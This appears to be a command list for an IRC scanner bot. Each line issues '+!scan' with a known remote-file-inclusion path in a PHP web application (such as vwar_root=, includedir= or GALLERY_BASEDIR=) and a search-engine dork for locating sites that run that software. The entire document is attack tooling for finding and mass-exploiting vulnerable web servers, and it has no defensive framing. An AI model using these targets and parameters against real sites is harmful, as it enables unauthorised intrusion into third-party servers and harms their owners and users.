+!scan /modules/kernel/system/startup.php?CFG_PHPGIGGLE_ROOT= CFG_PHPGIGGLE_ROOT
+!scan /modules/MusooTemplateLite.php?GLOBALS[ini_array][EXTLIB_PATH]= "Musoo 0.21"
+!scan /modules/MusooTemplateLite.php?GLOBALS[ini_array][EXTLIB_PATH]= "MusooTemplateLite.php"
+!scan /modules/MusooTemplateLite.php?GLOBALS[ini_array][EXTLIB_PATH]= "MusooTemplateLite.php?GLOBALS[ini_array][EXTLIB_PATH]="
+!scan /modules/My_eGallery/index.php?basepath= ".de.*"My_eGallery"
+!scan /modules/My_eGallery/index.php?basepath= "My_eGallery"
+!scan /modules/My_eGallery/public/displayCategory.php?basepath= modules.php?name=my_egallery
+!scan /modules/newbb_plus/class/forumpollrenderer.php?bbPath[path]= *br*/newbb_plus/*
+!scan /modules/PNphpBB2/includes/functions_admin.php?phpbb_root_path= modules.php?name=PNphpBB2
+!scan /modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir= "PostGuestbook"
+!scan /modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir= "PostGuestbook 0.6.1"
+!scan /modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir= PostGuestbook
+!scan /modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir= PostGuestbook 0.6.1
+!scan /modules/SoundImporter.php?GLOBALS[ini_array][EXTLIB_PATH]= "Musoo 0.21"
+!scan /modules/SoundImporter.php?GLOBALS[ini_array][EXTLIB_PATH]= "SoundImporter.php"
+!scan /modules/SoundImporter.php?GLOBALS[ini_array][EXTLIB_PATH]= "SoundImporter.php?GLOBALS[ini_array][EXTLIB_PATH]="
+!scan /modules/TotalCalendar/about.php?inc_dir= "TotalCalendar"
+!scan /modules/TotalCalendar/about.php?inc_dir= /TotalCalendar
+!scan /modules/TotalCalendar/about.php?inc_dir= TotalCalendar
+!scan /modules/vwar/admin/admin.php?vwar_root=  "Powered by: Virtual War" site:ch "Powered by: Virtual War v1.5.0"
+!scan /modules/vwar/admin/admin.php?vwar_root= "vwar"
+!scan /modules/vwar/admin/admin.php?vwar_root= "vwar" 
+!scan /modules/vwar/admin/admin.php?vwar_root= modules.php?name=vwar
+!scan /modules/vwar/admin/admin.php?vwar_root= vwar
+!scan /modules/vwar/admin/admin.php?vwar_root= vwar site:.com
+!scan /modules/vWar_Account/includes/functions_common.php?vwar_root2= "Powered by: Virtual War" site:ch "Powered by: Virtual War v1.5.0"
+!scan /modules/vWar_Account/includes/get_header.php?vwar_root= "Powered by: Virtual War" site:ch "Powered by: Virtual War v1.5.0"
+!scan /modules/wiwimod/spaw/spaw_control.class.php?spaw_root= "/modules/wiwimod/"
+!scan /modules/wiwimod/spaw/spaw_control.class.php?spaw_root= "spaw_control.class.php?spaw_root="
+!scan /modules/wiwimod/spaw/spaw_control.class.php?spaw_root= /modules/wiwimod/
+!scan /modules/xfsection/modify.php?dir_module= "modify.php"
+!scan /modules/xfsection/modify.php?dir_module= "modify.php?dir_module="
+!scan /modules/xfsection/modify.php?dir_module= "XOOPS Module XFsection"
+!scan /modules/xgallery/upgrade_album.php?GALLERY_BASEDIR= /xgallery/
+!scan /modules/xgallery/upgrade_album.php?GALLERY_BASEDIR= modules.php?name=xgallery
+!scan /modules/xoopsgallery/upgrade_album.php?GALLERY_BASEDIR= /xoopsgallery/
+!scan /more.php?sub= "more.php?sub="
+!scan /more.php?sub= more.php?sub=
+!scan /msDb.php?GLOBALS[ini_array][EXTLIB_PATH]= "msDb.php"
+!scan /msDb.php?GLOBALS[ini_array][EXTLIB_PATH]= "msDb.php?GLOBALS[ini_array][EXTLIB_PATH]="
+!scan /msDb.php?GLOBALS[ini_array][EXTLIB_PATH]= "Musoo 0.21"
+!scan /mwchat/libs/start_lobby.php?CONFIG[MWCHAT_Libs]=
+!scan /myevent.php?myevent_path= "uk/myevent.php
+!scan /myevent.php?myevent_path= myevent.php
+!scan /nav.php?g= "nav.php?g="
+!scan /nav.php?g= nav.php?g=
+!scan /nav.php?go= "nav.php?go="
+!scan /nav.php?go= nav.php?go=
+!scan /nav.php?lk= ".php?lk="
+!scan /nav.php?ln= .php?ln=
+!scan /nav.php?loc= .php?loc=
+!scan /nav.php?loc= nav.php
+!scan /nav.php?loc= nav.php?loc=
+!scan /nav.php?nav= "nav.php?nav="
+!scan /nav.php?nav= nav.php?nav=
+!scan /nav.php?p= "nav.php?p="
+!scan /nav.php?p= nav.php?p=
+!scan /nav.php?pag= "nav.php?pag="
+!scan /nav.php?pag= nav.php?pag=
+!scan /nav.php?page= "nav.php?page="
+!scan /nav.php?page= nav.php?page=
+!scan /nav.php?pagina= "nav.php?pagina="
+!scan /nav.php?pagina= nav.php?pagina=
+!scan /nav.php?pg= "nav.php?pg="
+!scan /nav.php?pg= nav.php?pg=
+!scan /ncaster/admin/addons/archive/archive.php?adminfolder= ncaster
+!scan /ncaster/admin/addons/archive/archive.php?adminfolder= Ncaster 1.7.2
+!scan /ndex.php?p= "edu/index.php?p=*.php"
+!scan /news_detail.php?file= "news_detail.php?file=*.php"
+!scan /newsletter/newsletter.php?waroot= newsletter.php?
+!scan /noticias.php?arq= "noticias.php?arq="
+!scan /old_reports.php?file= "old_reports.php?file=*.php"
+!scan /order.php?l= order.php?l=
+!scan /order.php?lang= order.php?lang=
+!scan /order.php?list= order.php?list=
+!scan /order.php?ln= order.php?ln=
+!scan /order.php?p= order.php?p=
+!scan /order.php?pag= order.php?pag=
+!scan /order.php?page= order.php?page=
+!scan /order.php?pg= order.php?pg=
+!scan /order.php?wp= .php?wp=
+!scan /order.php?wp= order.php?wp=
+!scan /order/login.php?svr_rootscript= "order?page=plan_show"
+!scan /p.php?p= "p.php?p="
+!scan /p.php?p= ".php?p="
+!scan /p.php?p= .php?p=
+!scan /p.php?p= p.php?p=
+!scan /page.php?a= "page.php?a=" 
+!scan /page.php?arq= .php?arq=
+!scan /page.php?b= "page.php?b=" 
+!scan /page.php?c= "page.php?c=" 
+!scan /page.php?d= "page.php?d=" 
+!scan /page.php?doc= "page.php?doc="
+!scan /page.php?e= "page.php?e=" 
+!scan /page.php?f= "page.php?f=" 
+!scan /page.php?g= "page.php?g=" 
+!scan /page.php?h= "page.php?h=" 
+!scan /page.php?i= "page.php?i=" 
+!scan /page.php?id= "Powered by RGameScript"
+!scan /page.php?j= "page.php?j=" 
+!scan /page.php?k= "page.php?k=" 
+!scan /page.php?l= "page.php?l=" 
+!scan /page.php?ln= .php?ln=
+!scan /page.php?m= "page.php?m=" 
+!scan /page.php?n= "page.php?n=" 
+!scan /page.php?o= "page.php?o=" 
+!scan /page.php?p= "page.php?p=" 
+!scan /page.php?p= ".php?p="
+!scan /page.php?p= .php?p=
+!scan /page.php?p= page.php?p=
+!scan /page.php?q= "page.php?q=" 
+!scan /page.php?r= "page.php?r=" 
+!scan /page.php?s= "page.php?s=" 
+!scan /page.php?s= ".php?s="
+!scan /page.php?s= .php?s=
+!scan /page.php?s= page.php?s=
+!scan /page.php?t= "page.php?t=" 
+!scan /page.php?u= "page.php?u=" 
+!scan /page.php?v= "page.php?v=" 
+!scan /page.php?x= "page.php?x=" 
+!scan /page.php?z= "page.php?z=" 
+!scan /page.php5?id= .php5?id=
+!scan /page.php5?id= page.php5?id=
+!scan /pages.php?page= "pages.php?page="
+!scan /pages.php?page= "pages.php?page=" 
+!scan /palportal/index.php?page= "/palportal/"
+!scan /palportal/index.php?page= "pal portal"
+!scan /palportal/index.php?page= /palportal/
+!scan /palportal/index.php?page= pal portal
+!scan /path/index.php?function=custom&custom= path
+!scan /photoalb/lib/static/header.php?set_menu= alliPhotoAlbum
+!scan /phphtml.php?htmlclass_path= "phphtml.php?htmlclass_path="
+!scan /phpSiteBackup-0.1/pcltar.lib.php?g_pcltar_lib_dir= "phpSiteBackup-0.1"
+!scan /phpwcms/include/inc_ext/spaw/dialogs/table.php?spaw_root= "index.php?id="
+!scan /phpwcms/include/inc_ext/spaw/dialogs/table.php?spaw_root= "phpwcms/index.php?id="
+!scan /phpwcms/include/inc_ext/spaw/dialogs/table.php?spaw_root= index.php?id=
+!scan /phpwcms/include/inc_ext/spaw/dialogs/table.php?spaw_root= phpwcms/index.php?id=
+!scan /phpwcms_template/inc_script/frontend_render/navigation/config_HTML_MENU.php?HTML_MENU_DirPath= Copyright © 2007 by Horst-D. Kröller · CMS: php WCMS 
+!scan /phpwcms_template/inc_script/frontend_render/navigation/config_HTML_MENU.php?HTML_MENU_DirPath= config_HTML_MENU.php
+!scan /phpwcms_template/inc_script/frontend_render/navigation/config_HTML_MENU.php?HTML_MENU_DirPath= config_HTML_MENU.php?HTML_MENU_DirPath=
+!scan /phpwcms_template/inc_script/frontend_render/navigation/config_PHPLM.php?HTML_MENU_DirPath= Copyright © 2007 by Horst-D. Kröller · CMS: php WCMS 
+!scan /phpwcms_template/inc_script/frontend_render/navigation/config_PHPLM.php?HTML_MENU_DirPath= config_PHPLM.php
+!scan /phpwcms_template/inc_script/frontend_render/navigation/config_PHPLM.php?HTML_MENU_DirPath= config_PHPLM.php?HTML_MENU_DirPath=
+!scan /plugins/widgets/htmledit/htmledit.php?_POWL[installPath]= "htmledit.php"
+!scan /plugins/widgets/htmledit/htmledit.php?_POWL[installPath]= "htmledit.php?_POWL[installPath]="
+!scan /plugins/widgets/htmledit/htmledit.php?_POWL[installPath]= "POWL - 0.94"
+!scan /pmi_v28/Includes/global.inc.php?strIncludePrefix= "global.inc.php"
+!scan /pmi_v28/Includes/global.inc.php?strIncludePrefix= "global.inc.php?strIncludePrefix="
+!scan /pmi_v28/Includes/global.inc.php?strIncludePrefix= /pmi_v28/
+!scan /popup_window.php?site_isp_root= "Squirrelcart"
+!scan /port.php?content= "port.php?content="
+!scan /port.php?content= port.php?content=*.php"
+!scan /ppa/inc/functions.inc.php?config[ppa_root_path]= **/screens/displayimage.php?pid=*
+!scan /presse.php?do= ".php?do="
+!scan /presse.php?do= "presse.php?do="
+!scan /principal.php?conteudo= "principal.php?conteudo="
+!scan /print.php?page= "print.php?page="
+!scan /print.php?pager= .php?pager=
+!scan /print.php?pager= print.php?pager=
+!scan /print.php?table= .php?table=
+!scan /prod.php?prod= ".php?prod="
+!scan /proddetail.php?prod= ".php?prod="
+!scan /products.php?prod= ".php?prod="
+!scan /produit.php?prod= ".php?prod="
+!scan /produkt.php?prod= ".php?prod="
+!scan /public_includes/pub_blocks/activecontent.php?vsDragonRootPath= "Php Blue Dragon"
+!scan /public_includes/pub_blocks/activecontent.php?vsDragonRootPath= activecontent.php
+!scan /qtf_checkname.php?lang= "qti_checkname.php?lang="
+!scan /qtf_j_birth.php?lang= "qtf_j_birth.php?lang="
+!scan /qtf_j_exists.php?lang= "qtf_j_exists.php"
+!scan /qti_checkname.php?lang= "qti_checkname.php?lang="
+!scan /read.php?fpage= /read.php?fpage=
+!scan /reports.php?sub= "reports.php?sub="
+!scan /reports.php?sub= reports.php?sub=
+!scan /rss.php?phpraid_dir= ""$2-"
+!scan /rss.php?phpraid_dir= "php raid"
+!scan /rss.php?phpraid_dir= "phpraid"
+!scan /rss.php?phpraid_dir= phpraid
+!scan /rss.php?phpraid_dir= php raid
+!scan /s.php?table= .php?table=
+!scan /s01.php?shopid= s01.php?shopid=
+!scan /s02.php?shopid= "powergap"
+!scan /s1.php?ln= .php?ln=
+!scan /saveserver.php?thisdir= /admin/business_inc/saveserver.php 
+!scan /script_path/templates/2blue/bodyTemplate.php?serverPath= "bodyTemplate.php?serverPath="
+!scan /script_path/templates/2blue/bodyTemplate.php?serverPath= "YourFreeScreamer"
+!scan /script_path/templates/2blue/bodyTemplate.php?serverPath= /2blue/
+!scan /search.php?cutepath= "search.php?"
+!scan /search.php?exec= search.php?exec=
+!scan /send_reminders.php?includedir= "send_reminders.php?includedir="
+!scan /services.php?page= "services.php?page="
+!scan /shop.php?prod= ".php?prod="
+!scan /shop.pl/page= shop.pl/page=
+!scan /show.php?page= "show.php?page="
+!scan /show.php?page1= ".php?page1="
+!scan /show.php?path= .ac.uk/fclick
+!scan /show.php?path= fclick
+!scan /show.php?product= .php?product=
+!scan /show.php?product= show.php?product=
+!scan /show_news.php?cutepath= "show_news.php?"
+!scan /ShowImage.php?name= "ShowImage.php?name="
+!scan /side.php?arq= .php?arq=
+!scan /side.php?table= .php?table=
+!scan /side.php?vis= .php?vis=
+!scan /side.php?vis= side.php?vis=
+!scan /site.php?arq= .php?arq=
+!scan /site.php?meio= .php?meio=
+!scan /site.php?table= .php?table=
+!scan /skin/board/default/doctype.php?dir= "doctype.php?dir="
+!scan /skin/board/default/doctype.php?dir= "Sun board"
+!scan /skin/zero_vote/error.php?dir= "skin/zero_vote/error.php"
+!scan /skin/zero_vote/error.php?dir= skin/zero_vote/error.php
+!scan /skins/advanced/advanced1.php?pluginpath[0]= "Sabdrimer CMS"
+!scan /skins/advanced/advanced1.php?pluginpath[0]= "Sabdrimer"
+!scan /skins/advanced/advanced1.php?pluginpath[0]= Sabdrimer
+!scan /skins/advanced/advanced1.php?pluginpath[0]= Sabdrimer CMS
+!scan /skins/advanced/advanced1.php?pluginpath[0]= skins/advanced/advanced1.php?pluginpath[0]= "CMS"
+!scan /skins/advanced/advanced1.php?pluginpath[0]= skins/advanced/advanced1.php?pluginpath[0]= "Sabdrimer CMS"
+!scan /smarty_config.php?root_dir= "smarty"
+!scan /solpot.html?body=  "solpot.html?body" 
+!scan /solpot.html?body=  "solpot.html?body"  
+!scan /sources/functions.php?CONFIG[main_path]= "(Powered By ScozNews)"
+!scan /sources/functions.php?CONFIG[main_path]= "Powered By ScozNews"
+!scan /sources/functions.php?CONFIG[main_path]= "ScozNews"
+!scan /sources/functions.php?CONFIG[main_path]= (Powered By ScozNews)
+!scan /sources/functions.php?CONFIG[main_path]= Powered By ScozNews
+!scan /sources/functions.php?CONFIG[main_path]= ScozNews
+!scan /sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]= "Aardvark TopSites"
+!scan /sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]= "Aardvark"
+!scan /sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]= "Powered By Aardvark Topsites PHP 4.2.2"
+!scan /sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]= Aardvark
+!scan /sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]= Aardvark TopSites
+!scan /sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]= Powered By Aardvark Topsites PHP 4.2.2
+!scan /sources/template.php?CONFIG[main_path]= "(Powered By ScozNews)"
+!scan /sources/template.php?CONFIG[main_path]= "ScozNews"
+!scan /sources/template.php?CONFIG[main_path]= (Powered By ScozNews)
+!scan /sources/template.php?CONFIG[main_path]= Powered By ScozNews
+!scan /sources/template.php?CONFIG[main_path]= ScozNews
+!scan /spellchecktext.php?SpellIncPath= "spellchecktext.php"
+!scan /spellcheckwindow.php?SpellIncPath= "spellcheckwindow.php"
+!scan /sphpell/checkpageinc.php?SpellIncPath= "checkpageinc.php"
+!scan /sphpell/spellchecktext.php?SpellIncPath= "spellchecktext.php"
+!scan /sphpell/spellcheckwindow.php?SpellIncPath= "spellcheckwindow.php"
+!scan /spid/lang/lang.php?lang_path= **/spid.php **/spid.php?cat=*lang=
+!scan /SQuery/lib/gore.php?libpath= "/SQuery/"
+!scan /squirrelcart/cart_content.php?cart_isp_root= /squirrelcart/ 
+!scan /squirrelcart/cart_content.php?cart_isp_root= /squirrelcart/  
+!scan /squito/photolist.inc.php?photoroot= "Squitosoft All Rights Reserved"
+!scan /start.php?id= ".php?id="
+!scan /start.php?id= "start.php?id="
+!scan /start.php?id= start.php?id=
+!scan /start.php?lang= .php?lang=
+!scan /start.php?lang= ".php?lang="
+!scan /start.php?lang= "start.php?lang="
+!scan /start.php?lang= start.php?lang=
+!scan /start.php?mod= ".php?mod="
+!scan /start.php?mod= "start.php?mod="
+!scan /start.php?p= start.php?p=
+!scan /start.php?pag= start.php?pag=
+!scan /start.php?page= ".php?page="
+!scan /start.php?page= "start.php?page="
+!scan /start.php?page= start.php?page=
+!scan /start.php?pg= start.php?pg=
+!scan /start.php?s= ".php?s="
+!scan /start.php?s= "start.php?s="
+!scan /start.php?s= start.php?s=
+!scan /str.php?l= str.php?l=
+!scan /str.php?lang= str.php?lang=
+!scan /str.php?ln= str.php?ln=
+!scan /str.php?p= str.php?p=
+!scan /str.php?page= str.php?page=
+!scan /sub.php?menu= "sub.php?menu="
+!scan /sub.php?menu= sub.php?menu=
+!scan /sub.php?s= "sub.php?s="
+!scan /sub.php?s= sub.php?s=
+!scan /sub.php?sub= "sub.php?sub="
+!scan /sub.php?sub= sub.php?sub=
+!scan /surveys/survey.inc.php?path= "surveys"
+!scan /surveys/survey.inc.php?path= surveys
+!scan /tags.php?BBCodeFile= "Tagger LE"
+!scan /tags.php?BBCodeFile= "tags.php"
+!scan /tags.php?BBCodeFile= "Tagger LE" "uk/tags.php
+!scan /tags.php?BBCodeFile= "Tagger LE" tags.php
+!scan /tags.php?BBCodeFile= "Tagger LE" tags.php site:br
+!scan /tags.php?BBCodeFile= tags.php
+!scan /tags.php?BBCodeFile= Tagger LE
+!scan /task.php?task= .php?task=
+!scan /task.php?task= task.php?task=
+!scan /template.php?goto= "template.php?goto="
+!scan /template.php?name= "template.php?name="
+!scan /template.php?page= "/template.php?page=*.php"
+!scan /template.php?pagina= "template.php?pagina="
+!scan /templates/headline_temp.php?nst_inc= "fusion news management system"
+!scan /templates/headline_temp.php?nst_inc= "fusion"
+!scan /templates/headline_temp.php?nst_inc= "management"
+!scan /templates/headline_temp.php?nst_inc= "news"
+!scan /templates/headline_temp.php?nst_inc= "system"
+!scan /templates/headline_temp.php?nst_inc= fusion
+!scan /templates/headline_temp.php?nst_inc= 'fusion"
+!scan /templates/headline_temp.php?nst_inc= fusion:news:management:system
+!scan /templates/headline_temp.php?nst_inc= management
+!scan /templates/headline_temp.php?nst_inc= news
+!scan /templates/headline_temp.php?nst_inc= system
+!scan /templates/mangobery/footer.sample.php?Site_Path= Mangobery
+!scan /templates/mangobery/footer.sample.php?Site_Path= Mangobery 0.5.5
+!scan /templates/mangobery/footer.sample.php?Site_Path= Mangobery-0.5.5
+!scan /test.php?page= test.php?page=
+!scan /tools/send_reminders.php?includedir=
+!scan /tools/send_reminders.php?includedir= "day.php?date="
+!scan /tools/send_reminders.php?includedir= day.php?date=
+!scan /tools/send_reminders.php?includedir= day.php?date=  /day.php?date=
+!scan /trans.php?trans= ".php?trans="
+!scan /trans.php?trans= "trans.php?trans="
+!scan /trans/trans.php?trans=&p= ".php?trans="
+!scan /trans/trans.php?trans=&page= ".php?trans="
+!scan /trans/trans.php?trans=en&page= ".php?trans="
+!scan /trans/trans.php?trans=eng&page= ".php?trans="
+!scan /trans/trans.php?trans=fr&page= ".php?trans="
+!scan /trans/trans.php?trans=ko&page= ".php?trans="
+!scan /tsep/include/colorswitch.php?tsep_config[absPath]= "Powered By TSEP" 
+!scan /video.php?content= "video.php?content="
+!scan /view.php?page= "view.php?page="
+!scan /view.php?sub= "view.php?sub="
+!scan /view.php?sub= view.php?sub=
+!scan /view.php?table= .php?table=
+!scan /voir.php?inc= ".php?inc="
+!scan /vwar/admin/admin.php?vwar_root= "Powered by: Virtual War" site:ch "Powered by: Virtual War v1.5.0"
+!scan /vwar/war.php?action= "Powered by: Virtual War" site:ch "Powered by: Virtual War v1.5.0"
+!scan /wamp_dir/setup/yesno.phtml?no_url= "setup"
+!scan /werbungFrame.php?do= ".php?do="
+!scan /ws/get_events.php?includedir= "/WebCalendar/"
+!scan /ws/get_events.php?includedir= "WebCalendar"
+!scan /ws/get_events.php?includedir= /WebCalendar/
+!scan /ws/get_events.php?includedir= Web Calendar
+!scan /ws/get_events.php?includedir= WebCalendar
+!scan /ws/get_events.php?includedir= WebCalendar v0.9.45
+!scan /ws/get_reminders.php?includedir= WebCalendar
+!scan /ws/get_reminders.php?includedir= WebCalendar v0.9.45
+!scan /ws/login.php?includedir= WebCalendar
+!scan /ws/login.php?includedir= WebCalendar v0.9.45
+!scan /yabbse/Sources/Packages.php?sourcedir= Yabbse
+!scan /zipndownload.php?PP_PATH= "PhotoPost PHP 4.6"
+!scan /zipndownload.php?PP_PATH= "PhotoPost PHP"
+!scan /zipndownload.php?PP_PATH= "PhotoPost"
+!scan /zipndownload.php?PP_PATH= "PhotoPostP"
+!scan /zipndownload.php?PP_PATH= "Powered by: PhotoPost PHP 4.6"
+!scan /zipndownload.php?PP_PATH= PhotoPost
+!scan /zipndownload.php?PP_PATH= PhotoPost PHP 4.6
+!scan /zipndownload.php?PP_PATH= Powered by: PhotoPost PHP 4.6
+!scan \saf\lib\PEAR\PhpDocumentor\Documentation\tests\559668.php?FORUM[LIB]= "powered by Sitellite"
